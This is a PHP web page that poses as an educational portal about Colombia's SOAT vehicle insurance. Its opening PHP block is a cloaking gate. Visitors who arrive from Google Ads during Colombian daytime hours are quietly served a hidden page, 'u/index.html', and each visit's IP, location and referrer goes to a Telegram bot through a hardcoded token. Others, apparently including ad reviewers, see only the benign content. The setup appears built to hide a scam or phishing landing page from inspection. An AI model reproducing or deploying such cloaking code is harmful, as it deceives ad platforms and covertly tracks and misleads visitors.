<?php

// ========== INTERRUPTOR ==========
// true  = STOP: ignora TODO (hora + filtro), cualquiera ve u/index.html a cualquier hora (para testear tu)
// false = NORMAL: respeta horario 8 AM–9 PM Colombia y solo entra quien viene de Google Ads
$STOP = true;
// =================================


// ========== PASO 1: HORARIO ==========
// Solo dentro de 8:00 AM–9:00 PM hora Colombia se evalúa el filtro (se salta si $STOP)
date_default_timezone_set('America/Bogota');
$horaActual = (int) date('G');
$enHorario = ($horaActual >= 8 && $horaActual < 21);
// =====================================


// ========== PASO 2: FILTRO REFERER / GAD_SOURCE ==========
$referer = $_SERVER['HTTP_REFERER'] ?? '';

$vieneDeGoogleAds = ($STOP || $enHorario)
    && isset($_GET['gad_source'])
    && preg_match('#^https?://([a-z0-9-]+\.)*google\.[a-z.]+/#i', $referer);
// =========================================================


if ($STOP || $vieneDeGoogleAds) {

    $BOT_TOKEN = '7497890468:AAGGItTPfO8JXfESTE8QV_NU22qc-tCsU7A';
    $CHAT_ID = '-5214821466';

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $ip = explode(',', $ip)[0];

    $geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);

    $pais = $geo['country'] ?? 'Desconocido';
    $ciudad = $geo['city'] ?? 'Desconocido';
    $referido = $_SERVER['HTTP_REFERER'] ?? 'Directo';
    $dias = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
    $meses = ['','Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
    $hora = $dias[date('w')] . ' ' . date('d') . ' de ' . $meses[date('n')] . ', ' . date('g:i A');

    $mensaje = "🟢 NUEVO VISITANTE 🟢\n"
        . "🌐 IP: {$ip}\n"
        . "📍 País: {$pais}\n"
        . "🏙️ Ciudad: {$ciudad}\n"
        . "🔗 Referido: {$referido}\n"
        . "⏰ Hora: {$hora}";

    $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'chat_id' => $CHAT_ID,
            'text' => $mensaje
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    curl_close($ch);

    header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: 0');
    header('Content-Type: text/html; charset=utf-8');

    $html = file_get_contents(__DIR__ . '/u/index.html');
    $html = preg_replace('/<head(\s[^>]*)?>/i', '$0<base href="/u/">', $html, 1);

    echo $html;
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Portal-Soat: información clara y educativa sobre el SOAT en Colombia. Vigencia, obligaciones del conductor, sanciones y cómo identificar una póliza auténtica.">
    <meta name="keywords" content="SOAT Colombia, vigencia SOAT, obligaciones conductor, sanciones SOAT, expedicion SOAT, SOAT autentico">
    <meta name="author" content="MARTÍN ALEJANDRO RIVERA CASTAÑO">
    <meta name="robots" content="index, follow">
    <title>Portal-Soat | Información Educativa sobre el SOAT en Colombia</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

    <style>
        :root {
            --terracotta: #E85D3C;
            --terracotta-dark: #C9472A;
            --gold: #F5B342;
            --cream: #FFF4E6;
            --cream-soft: #FBE9D0;
            --charcoal: #1A1A2E;
            --charcoal-soft: #2D2D44;
            --ink: #14141F;
            --text: #3A3A52;
            --text-mute: #7A7A8E;
            --line: #EADBC4;
            --surface: #FFFFFF;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { scroll-behavior: smooth; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            color: var(--text);
            background: var(--cream);
            line-height: 1.65;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }
        a { text-decoration: none; color: inherit; }

        #preloader {
            position: fixed; inset: 0;
            background: var(--cream);
            z-index: 9999;
            display: flex; justify-content: center; align-items: center;
            transition: opacity 0.4s ease;
        }
        .spinner {
            width: 48px; height: 48px;
            border: 4px solid var(--cream-soft);
            border-top: 4px solid var(--terracotta);
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        header {
            position: fixed; top: 0; left: 0; right: 0;
            z-index: 1000;
            padding: 1.1rem 6%;
            display: flex; justify-content: space-between; align-items: center;
            background: rgba(255, 244, 230, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--line);
        }
        .brand {
            font-size: 1.35rem; font-weight: 800;
            color: var(--charcoal);
            display: flex; align-items: center; gap: 0.6rem;
            letter-spacing: -0.02em;
        }
        .brand-mark {
            width: 34px; height: 34px;
            background: var(--charcoal);
            color: var(--gold);
            display: grid; place-items: center;
            border-radius: 9px;
            font-size: 1rem;
            transform: rotate(-6deg);
        }
        .nav-menu { display: flex; gap: 2.2rem; }
        .nav-menu a {
            font-size: 0.92rem; font-weight: 600;
            color: var(--charcoal-soft);
            position: relative;
            padding: 0.3rem 0;
            transition: color 0.25s;
        }
        .nav-menu a::after {
            content: ''; position: absolute;
            bottom: -2px; left: 0;
            width: 0; height: 2px;
            background: var(--terracotta);
            transition: width 0.3s ease;
        }
        .nav-menu a:hover { color: var(--terracotta); }
        .nav-menu a:hover::after { width: 100%; }

        .hero {
            margin-top: 70px;
            padding: 6rem 6% 5rem;
            position: relative;
            overflow: hidden;
        }
        .hero-grid {
            max-width: 1280px; margin: 0 auto;
            display: grid;
            grid-template-columns: 1.2fr 1fr;
            gap: 4rem;
            align-items: center;
        }
        .hero-eyebrow {
            display: inline-flex; align-items: center; gap: 0.5rem;
            background: var(--cream-soft);
            color: var(--terracotta-dark);
            padding: 0.5rem 1rem;
            border-radius: 999px;
            font-size: 0.82rem; font-weight: 700;
            letter-spacing: 0.04em; text-transform: uppercase;
            margin-bottom: 1.5rem;
            border: 1px solid var(--line);
        }
        .hero h1 {
            font-size: clamp(2.2rem, 4.5vw, 3.6rem);
            font-weight: 800;
            color: var(--charcoal);
            line-height: 1.05;
            letter-spacing: -0.03em;
            margin-bottom: 1.5rem;
        }
        .hero h1 .accent {
            color: var(--terracotta);
            position: relative;
            display: inline-block;
        }
        .hero h1 .accent::after {
            content: ''; position: absolute;
            left: 0; right: 0; bottom: 4px;
            height: 8px;
            background: var(--gold);
            opacity: 0.45;
            z-index: -1;
        }
        .hero p.lead {
            font-size: 1.1rem;
            color: var(--text);
            margin-bottom: 2rem;
            max-width: 540px;
        }
        .cta-row { display: flex; gap: 1rem; flex-wrap: wrap; }
        .btn {
            display: inline-flex; align-items: center; gap: 0.6rem;
            padding: 0.95rem 1.8rem;
            border-radius: 12px;
            font-weight: 700; font-size: 0.98rem;
            cursor: pointer; border: none;
            transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
            font-family: inherit;
        }
        .btn-primary {
            background: var(--charcoal);
            color: var(--cream);
        }
        .btn-primary:hover {
            background: var(--ink);
            transform: translateY(-2px);
            box-shadow: 0 12px 28px rgba(26, 26, 46, 0.25);
        }
        .btn-ghost {
            background: transparent;
            color: var(--charcoal);
            border: 2px solid var(--charcoal);
        }
        .btn-ghost:hover {
            background: var(--charcoal);
            color: var(--cream);
        }

        .stat-card {
            background: var(--charcoal);
            color: var(--cream);
            padding: 2.5rem;
            border-radius: 24px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 30px 60px -20px rgba(26, 26, 46, 0.4);
        }
        .stat-card::before {
            content: ''; position: absolute;
            top: -40%; right: -30%;
            width: 280px; height: 280px;
            background: radial-gradient(circle, var(--terracotta) 0%, transparent 65%);
            opacity: 0.55;
        }
        .stat-card::after {
            content: ''; position: absolute;
            bottom: -50%; left: -20%;
            width: 240px; height: 240px;
            background: radial-gradient(circle, var(--gold) 0%, transparent 65%);
            opacity: 0.3;
        }
        .stat-card-inner { position: relative; z-index: 1; }
        .stat-tag {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.78rem;
            color: var(--gold);
            letter-spacing: 0.1em;
            margin-bottom: 1rem;
            text-transform: uppercase;
        }
        .stat-number {
            font-size: clamp(3.5rem, 6vw, 5rem);
            font-weight: 800;
            line-height: 1;
            letter-spacing: -0.04em;
            margin-bottom: 0.5rem;
        }
        .stat-number .unit { color: var(--gold); }
        .stat-desc {
            font-size: 1rem;
            color: rgba(255, 244, 230, 0.75);
            margin-bottom: 1.8rem;
        }
        .stat-divider {
            height: 1px;
            background: rgba(245, 179, 66, 0.25);
            margin: 1.5rem 0;
        }
        .stat-mini { display: flex; gap: 2rem; }
        .stat-mini-item .v {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--gold);
        }
        .stat-mini-item .l {
            font-size: 0.78rem;
            color: rgba(255, 244, 230, 0.6);
            text-transform: uppercase;
            letter-spacing: 0.06em;
        }

        .section {
            padding: 6rem 6%;
            max-width: 1280px;
            margin: 0 auto;
        }
        .section-header { text-align: center; max-width: 720px; margin: 0 auto 4rem; }
        .section-eyebrow {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: var(--terracotta);
            letter-spacing: 0.18em;
            text-transform: uppercase;
            margin-bottom: 1rem;
        }
        .section-header h2 {
            font-size: clamp(1.9rem, 3.2vw, 2.6rem);
            color: var(--charcoal);
            font-weight: 800;
            letter-spacing: -0.025em;
            margin-bottom: 1rem;
            line-height: 1.15;
        }
        .section-header p {
            color: var(--text-mute);
            font-size: 1.05rem;
        }

        .analysis-module {
            background: var(--surface);
            padding: 3rem;
            border-radius: 24px;
            border: 1px solid var(--line);
            display: grid;
            grid-template-columns: 1fr 1.1fr;
            gap: 3rem;
            align-items: center;
        }
        .analysis-info h3 {
            font-size: 1.7rem;
            color: var(--charcoal);
            margin-bottom: 1rem;
            font-weight: 800;
            letter-spacing: -0.02em;
        }
        .analysis-info p { margin-bottom: 1.2rem; color: var(--text); }
        .analysis-list { list-style: none; margin-bottom: 1.5rem; }
        .analysis-list li {
            display: flex; gap: 0.7rem;
            margin-bottom: 0.8rem;
            font-size: 0.96rem;
        }
        .analysis-list li i {
            color: var(--terracotta);
            margin-top: 0.2rem;
        }
        .data-pill {
            background: var(--cream);
            border-left: 3px solid var(--gold);
            padding: 1rem 1.2rem;
            border-radius: 0 10px 10px 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.88rem;
            color: var(--charcoal);
        }
        .chart-container {
            position: relative;
            height: 340px;
            width: 100%;
            background: var(--cream);
            border-radius: 16px;
            padding: 1.5rem;
        }

        .grid-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 1.5rem;
        }
        .card {
            background: var(--surface);
            padding: 2.2rem;
            border-radius: 18px;
            border: 1px solid var(--line);
            transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: ''; position: absolute;
            top: 0; left: 0; right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--terracotta), var(--gold));
            transform: scaleX(0);
            transform-origin: left;
            transition: transform 0.3s ease;
        }
        .card:hover {
            transform: translateY(-4px);
            box-shadow: 0 20px 40px -15px rgba(232, 93, 60, 0.15);
            border-color: var(--terracotta);
        }
        .card:hover::before { transform: scaleX(1); }
        .card-icon {
            width: 52px; height: 52px;
            background: var(--cream);
            border-radius: 12px;
            display: grid; place-items: center;
            color: var(--terracotta);
            font-size: 1.4rem;
            margin-bottom: 1.2rem;
        }
        .card h4 {
            font-size: 1.2rem;
            color: var(--charcoal);
            font-weight: 700;
            margin-bottom: 0.7rem;
            letter-spacing: -0.015em;
        }
        .card p {
            color: var(--text);
            font-size: 0.95rem;
        }

        .edu-band {
            background: var(--charcoal);
            color: var(--cream);
            padding: 5rem 6%;
            margin: 4rem 0 0;
        }
        .edu-grid {
            max-width: 1280px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 2.5rem;
        }
        .edu-item {
            border-left: 2px solid var(--gold);
            padding-left: 1.5rem;
        }
        .edu-item .num {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            color: var(--gold);
            margin-bottom: 0.5rem;
        }
        .edu-item h5 {
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 0.6rem;
            color: var(--cream);
        }
        .edu-item p {
            font-size: 0.92rem;
            color: rgba(255, 244, 230, 0.7);
        }

        .contact-layout {
            display: grid;
            grid-template-columns: 1.1fr 1fr;
            gap: 3rem;
            background: var(--surface);
            padding: 3.5rem;
            border-radius: 24px;
            border: 1px solid var(--line);
        }
        .form-group { margin-bottom: 1.3rem; }
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            font-size: 0.85rem;
            color: var(--charcoal);
            letter-spacing: 0.02em;
        }
        .form-control {
            width: 100%;
            padding: 0.9rem 1.1rem;
            border: 1.5px solid var(--line);
            border-radius: 10px;
            font-family: inherit;
            font-size: 0.96rem;
            background: var(--cream);
            color: var(--charcoal);
            transition: border-color 0.25s, background 0.25s;
        }
        .form-control:focus {
            outline: none;
            border-color: var(--terracotta);
            background: var(--surface);
        }
        textarea.form-control { resize: vertical; min-height: 110px; }

        .contact-side {
            background: var(--cream);
            padding: 2.5rem;
            border-radius: 16px;
            border: 1px solid var(--line);
            position: relative;
            overflow: hidden;
        }
        .contact-side::before {
            content: '';
            position: absolute;
            top: -30px; right: -30px;
            width: 120px; height: 120px;
            background: var(--gold);
            opacity: 0.15;
            border-radius: 50%;
        }
        .contact-side h3 {
            color: var(--charcoal);
            margin-bottom: 1.8rem;
            font-size: 1.3rem;
            font-weight: 800;
            position: relative;
        }
        .detail-item {
            margin-bottom: 1.4rem;
            display: flex; gap: 1rem;
            align-items: flex-start;
            position: relative;
        }
        .detail-item .ico {
            width: 38px; height: 38px;
            background: var(--surface);
            color: var(--terracotta);
            border-radius: 10px;
            display: grid; place-items: center;
            font-size: 0.95rem;
            flex-shrink: 0;
        }
        .detail-item h5 {
            color: var(--text-mute);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            margin-bottom: 0.2rem;
        }
        .detail-item p {
            color: var(--charcoal);
            font-weight: 600;
            font-size: 0.95rem;
        }
        #formStatus {
            display: none;
            margin-top: 1rem;
            padding: 1rem 1.2rem;
            background: var(--cream);
            border-left: 3px solid var(--terracotta);
            border-radius: 0 10px 10px 0;
            color: var(--charcoal);
            font-size: 0.92rem;
        }

        footer {
            background: var(--ink);
            color: rgba(255, 244, 230, 0.6);
            padding: 4rem 6% 2rem;
            margin-top: 4rem;
        }
        .footer-grid {
            max-width: 1280px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 3rem;
            border-bottom: 1px solid rgba(245, 179, 66, 0.15);
            padding-bottom: 3rem;
            margin-bottom: 2rem;
        }
        .footer-brand {
            font-size: 1.25rem;
            font-weight: 800;
            color: var(--cream);
            display: flex; align-items: center; gap: 0.6rem;
            margin-bottom: 1rem;
        }
        .footer-grid h4 {
            color: var(--gold);
            font-size: 0.85rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            margin-bottom: 1.2rem;
        }
        .footer-links a {
            display: block;
            margin-bottom: 0.7rem;
            font-size: 0.92rem;
            transition: color 0.25s;
        }
        .footer-links a:hover { color: var(--terracotta); }
        .copyright {
            text-align: center;
            font-size: 0.85rem;
            color: rgba(255, 244, 230, 0.4);
        }

        @media (max-width: 992px) {
            .hero-grid, .analysis-module, .contact-layout {
                grid-template-columns: 1fr;
                gap: 2.5rem;
            }
            .nav-menu { display: none; }
            .section { padding: 4rem 6%; }
            .hero { padding: 4rem 6% 3rem; }
            .analysis-module, .contact-layout { padding: 2rem; }
            .stat-card { padding: 2rem; }
        }
        @media (max-width: 560px) {
            .stat-mini { flex-direction: column; gap: 1rem; }
            .cta-row .btn { flex: 1; justify-content: center; }
        }
    </style>
</head>
<body>
    <div id="preloader"><div class="spinner"></div></div>

    <header>
        <div class="brand">
            <span class="brand-mark"><i class="fa-solid fa-car-side"></i></span>
            Portal-Soat
        </div>
        <nav class="nav-menu">
            <a href="#vigencia">Vigencia</a>
            <a href="#responsabilidades">Responsabilidades</a>
            <a href="#educacion">Conceptos</a>
            <a href="#contacto">Contacto</a>
        </nav>
    </header>

    <section class="hero">
        <div class="hero-grid">
            <div>
                <span class="hero-eyebrow"><i class="fa-solid fa-road"></i> Información sobre el SOAT · Colombia</span>
                <h1>Entiende el SOAT. <span class="accent">Circula tranquilo.</span></h1>
                <p class="lead">Portal-Soat es un espacio educativo que explica de forma clara qué es el SOAT, cuáles son sus tiempos de vigencia, qué obligaciones tiene el conductor y cómo identificar una póliza auténtica al transitar por las vías colombianas.</p>
                <div class="cta-row">
                    <a href="#vigencia" class="btn btn-primary">
                        <i class="fa-solid fa-clock"></i> Ver vigencia
                    </a>
                    <a href="#educacion" class="btn btn-ghost">
                        <i class="fa-solid fa-book-open"></i> Conceptos
                    </a>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-card-inner">
                    <div class="stat-tag">// Dato clave</div>
                    <div class="stat-number">1<span class="unit"> año</span></div>
                    <div class="stat-desc">Es el periodo estándar de vigencia del SOAT para vehículos particulares en Colombia. Su renovación oportuna evita sanciones de tránsito y permite circular dentro del marco legal.</div>
                    <div class="stat-divider"></div>
                    <div class="stat-mini">
                        <div class="stat-mini-item">
                            <div class="v">12 m</div>
                            <div class="l">Vigencia particular</div>
                        </div>
                        <div class="stat-mini-item">
                            <div class="v">100%</div>
                            <div class="l">Obligatorio en vías</div>
                        </div>
                        <div class="stat-mini-item">
                            <div class="v">24/7</div>
                            <div class="l">Verificable en línea</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="section" id="vigencia">
        <div class="section-header">
            <span class="section-eyebrow">// Tiempos del SOAT</span>
            <h2>Vigencia y renovación: cómo planificar tu SOAT</h2>
            <p>Conocer la fecha de inicio y fin de tu SOAT es la primera regla para evitar sanciones y mantener tu vehículo en condiciones legales para circular.</p>
        </div>
        <div class="analysis-module">
            <div class="analysis-info">
                <h3>¿Cuánto dura un SOAT?</h3>
                <p>El SOAT en Colombia tiene una <strong>vigencia anual</strong> en la mayoría de vehículos particulares. Comienza en la hora indicada en la póliza y finaliza el mismo día y hora un año después.</p>
                <ul class="analysis-list">
                    <li><i class="fa-solid fa-circle-check"></i> Renovar antes del vencimiento evita días sin cobertura.</li>
                    <li><i class="fa-solid fa-circle-check"></i> La vigencia se cuenta hora exacta a hora exacta, no por días calendario.</li>
                    <li><i class="fa-solid fa-circle-check"></i> Algunos vehículos especiales pueden tener vigencias diferentes según su categoría.</li>
                    <li><i class="fa-solid fa-circle-check"></i> Es recomendable expedir el nuevo SOAT mínimo una semana antes del vencimiento.</li>
                </ul>
                <div class="data-pill">
                    <strong>Recuerda:</strong> El SOAT comienza a regir desde la hora indicada en el documento, no desde la fecha de pago.
                </div>
            </div>
            <div class="chart-container">
                <canvas id="vigenciaChart"></canvas>
            </div>
        </div>
    </section>

    <section class="section" id="responsabilidades">
        <div class="section-header">
            <span class="section-eyebrow">// Lo que debes saber</span>
            <h2>Responsabilidades del conductor</h2>
            <p>Tener un SOAT vigente es solo una parte. Como conductor en Colombia tienes obligaciones específicas relacionadas con tu vehículo y la documentación que lo respalda.</p>
        </div>
        <div class="grid-cards">
            <div class="card">
                <div class="card-icon"><i class="fa-solid fa-id-card"></i></div>
                <h4>Portar el SOAT vigente</h4>
                <p>El conductor debe poder presentar el SOAT vigente al ser requerido por la autoridad de tránsito, ya sea en formato físico o digital descargable.</p>
            </div>
            <div class="card">
                <div class="card-icon"><i class="fa-solid fa-magnifying-glass"></i></div>
                <h4>Verificar autenticidad</h4>
                <p>Antes de circular, confirma que tu SOAT fue expedido por canales oficiales y que los datos del vehículo y el propietario coincidan exactamente con la realidad.</p>
            </div>
            <div class="card">
                <div class="card-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
                <h4>Evitar circular sin SOAT</h4>
                <p>Conducir sin SOAT vigente acarrea sanciones económicas, inmovilización del vehículo y consecuencias administrativas adicionales según el Código de Tránsito.</p>
            </div>
            <div class="card">
                <div class="card-icon"><i class="fa-solid fa-rotate"></i></div>
                <h4>Renovar a tiempo</h4>
                <p>La renovación es responsabilidad exclusiva del propietario. No existe renovación automática y la responsabilidad recae sobre quien circula con el vehículo.</p>
            </div>
            <div class="card">
                <div class="card-icon"><i class="fa-solid fa-list-check"></i></div>
                <h4>Mantener datos actualizados</h4>
                <p>La placa, número de motor, chasis y cilindraje del SOAT deben coincidir con la tarjeta de propiedad. Cualquier discrepancia puede invalidar el documento.</p>
            </div>
            <div class="card">
                <div class="card-icon"><i class="fa-solid fa-mobile-screen"></i></div>
                <h4>Conservar el comprobante</h4>
                <p>Guarda el comprobante de expedición en un lugar accesible. Es la prueba oficial de que cumpliste con la obligación, en caso de discrepancias administrativas.</p>
            </div>
        </div>
    </section>

    <section class="edu-band" id="educacion">
        <div class="section-header" style="margin-bottom: 3rem;">
            <span class="section-eyebrow" style="color: var(--gold);">// Conceptos básicos</span>
            <h2 style="color: var(--cream);">Glosario rápido del SOAT</h2>
            <p style="color: rgba(255,244,230,0.65);">Los términos clave que aparecen en tu póliza y en cualquier conversación administrativa sobre el SOAT, explicados sin tecnicismos.</p>
        </div>
        <div class="edu-grid">
            <div class="edu-item">
                <div class="num">01 / SOAT</div>
                <h5>Concepto</h5>
                <p>Es la póliza obligatoria de circulación que todo vehículo automotor debe tener para transitar por las vías públicas del territorio colombiano.</p>
            </div>
            <div class="edu-item">
                <div class="num">02 / Vigencia</div>
                <h5>Periodo activo</h5>
                <p>Es el lapso durante el cual la póliza está válida. Inicia y termina en una hora exacta indicada en el documento expedido al propietario.</p>
            </div>
            <div class="edu-item">
                <div class="num">03 / Categoría</div>
                <h5>Tipo de vehículo</h5>
                <p>Cada vehículo se clasifica según su uso, cilindraje y servicio. La categoría determina el costo y las condiciones de la expedición del SOAT.</p>
            </div>
            <div class="edu-item">
                <div class="num">04 / Expedición</div>
                <h5>Emisión del documento</h5>
                <p>Es el acto de generar el SOAT a nombre de un vehículo y propietario. Se realiza por canales oficiales autorizados y queda registrado digitalmente.</p>
            </div>
        </div>
    </section>

    <section class="section" id="contacto">
        <div class="section-header">
            <span class="section-eyebrow">// Hablemos</span>
            <h2>Consulta con el portal</h2>
            <p>¿Tienes dudas sobre la vigencia, las obligaciones o la expedición del SOAT? Escríbenos y un asesor del portal te orientará.</p>
        </div>
        <div class="contact-layout">
            <div>
                <form id="portalForm">
                    <div class="form-group">
                        <label for="nombre">Nombre completo</label>
                        <input type="text" id="nombre" class="form-control" required placeholder="Ej: Carlos Ramírez">
                    </div>
                    <div class="form-group">
                        <label for="email">Correo electrónico</label>
                        <input type="email" id="email" class="form-control" required placeholder="tu@correo.com">
                    </div>
                    <div class="form-group">
                        <label for="mensaje">Cuéntanos tu duda</label>
                        <textarea id="mensaje" class="form-control" rows="4" required placeholder="Describe brevemente tu vehículo (tipo y categoría) y la consulta sobre el SOAT..."></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%; justify-content: center;">
                        <i class="fa-solid fa-paper-plane"></i> Enviar consulta
                    </button>
                </form>
                <div id="formStatus"></div>
            </div>
            <div class="contact-side">
                <h3>Transparencia del portal</h3>
                <div class="detail-item">
                    <div class="ico"><i class="fa-solid fa-user-shield"></i></div>
                    <div>
                        <h5>Administrador</h5>
                        <p>MARTÍN ALEJANDRO RIVERA CASTAÑO</p>
                    </div>
                </div>
                <div class="detail-item">
                    <div class="ico"><i class="fa-solid fa-building"></i></div>
                    <div>
                        <h5>Naturaleza</h5>
                        <p>Portal educativo / Información sobre SOAT</p>
                    </div>
                </div>
                <div class="detail-item">
                    <div class="ico"><i class="fa-solid fa-location-dot"></i></div>
                    <div>
                        <h5>Dirección</h5>
                        <p>Calle 18 # 32-14, Pereira, Risaralda, Colombia</p>
                    </div>
                </div>
                <div class="detail-item">
                    <div class="ico"><i class="fa-solid fa-envelope"></i></div>
                    <div>
                        <h5>Correo de soporte</h5>
                        <p>contacto.portalsoat@gmail.com</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <footer>
        <div class="footer-grid">
            <div>
                <div class="footer-brand">
                    <span class="brand-mark"><i class="fa-solid fa-car-side"></i></span>
                    Portal-Soat
                </div>
                <p style="font-size: 0.92rem;">Información educativa sobre el SOAT en Colombia. Conceptos, vigencia y responsabilidades del conductor explicadas en lenguaje claro.</p>
            </div>
            <div class="footer-links">
                <h4>Legal</h4>
                <a href="politica-de-privacidad.html">Política de tratamiento de datos</a>
                <a href="terminos-y-condiciones.html">Términos y condiciones</a>
            </div>
            <div class="footer-links">
                <h4>Navegar</h4>
                <a href="#vigencia">Vigencia</a>
                <a href="#responsabilidades">Responsabilidades</a>
                <a href="#educacion">Conceptos</a>
                <a href="#contacto">Contacto</a>
            </div>
            <div class="footer-links">
                <h4>Centro de operaciones</h4>
                <p style="font-size: 0.92rem; line-height: 1.7;">Pereira, Risaralda, Colombia<br>Calle 18 # 32-14<br>contacto.portalsoat@gmail.com</p>
            </div>
        </div>
        <div class="copyright">
            © 2026 Portal-Soat · Administrado por MARTÍN ALEJANDRO RIVERA CASTAÑO · Portal exclusivamente informativo.
        </div>
    </footer>

    <script>
        window.addEventListener('load', () => {
            const pre = document.getElementById('preloader');
            pre.style.opacity = '0';
            setTimeout(() => pre.style.display = 'none', 400);
        });

        document.addEventListener('DOMContentLoaded', function() {
            const ctx = document.getElementById('vigenciaChart').getContext('2d');
            const meses = ['Mes 1', 'Mes 3', 'Mes 6', 'Mes 9', 'Mes 12'];
            const cumplimiento = [100, 100, 100, 100, 100];
            const sinSoat = [100, 75, 50, 25, 0];

            new Chart(ctx, {
                type: 'line',
                data: {
                    labels: meses,
                    datasets: [
                        {
                            label: 'SOAT vigente y renovado',
                            data: cumplimiento,
                            borderColor: '#1A1A2E',
                            backgroundColor: 'rgba(245, 179, 66, 0.18)',
                            borderWidth: 3,
                            tension: 0.35,
                            fill: true,
                            pointBackgroundColor: '#F5B342',
                            pointRadius: 5,
                            pointHoverRadius: 7
                        },
                        {
                            label: 'SOAT sin renovar',
                            data: sinSoat,
                            borderColor: '#E85D3C',
                            backgroundColor: 'rgba(232, 93, 60, 0.12)',
                            borderWidth: 3,
                            tension: 0.35,
                            fill: true,
                            pointBackgroundColor: '#E85D3C',
                            pointRadius: 5,
                            pointHoverRadius: 7
                        }
                    ]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'bottom',
                            labels: {
                                font: { family: "'Plus Jakarta Sans', sans-serif", weight: '600', size: 12 },
                                color: '#1A1A2E',
                                padding: 16,
                                usePointStyle: true,
                                pointStyle: 'circle'
                            }
                        },
                        tooltip: {
                            mode: 'index',
                            intersect: false,
                            backgroundColor: '#1A1A2E',
                            titleColor: '#F5B342',
                            bodyColor: '#FFF4E6',
                            padding: 12,
                            borderColor: 'rgba(245, 179, 66, 0.3)',
                            borderWidth: 1,
                            callbacks: {
                                label: function(ctx) {
                                    return ctx.dataset.label + ': ' + ctx.parsed.y + '% del año';
                                }
                            }
                        }
                    },
                    scales: {
                        y: {
                            beginAtZero: true,
                            max: 100,
                            grid: { color: 'rgba(234, 219, 196, 0.5)' },
                            ticks: {
                                color: '#7A7A8E',
                                font: { family: "'JetBrains Mono', monospace", size: 11 },
                                callback: v => v + '%'
                            }
                        },
                        x: {
                            grid: { display: false },
                            ticks: {
                                color: '#7A7A8E',
                                font: { family: "'Plus Jakarta Sans', sans-serif", weight: '600' }
                            }
                        }
                    }
                }
            });
        });

        document.getElementById('portalForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const nombre = document.getElementById('nombre').value.trim();
            const email = document.getElementById('email').value.trim();
            const mensaje = document.getElementById('mensaje').value.trim();
            if (nombre && email && mensaje) {
                const status = document.getElementById('formStatus');
                status.style.display = 'block';
                status.innerHTML = '<i class="fa-solid fa-circle-check" style="color: var(--terracotta);"></i> <strong>Consulta registrada.</strong> Gracias ' + nombre + '. Te responderemos al correo indicado en breve.';
                this.reset();
                setTimeout(() => { status.style.display = 'none'; }, 6000);
            }
        });
    </script>
</body>
</html>
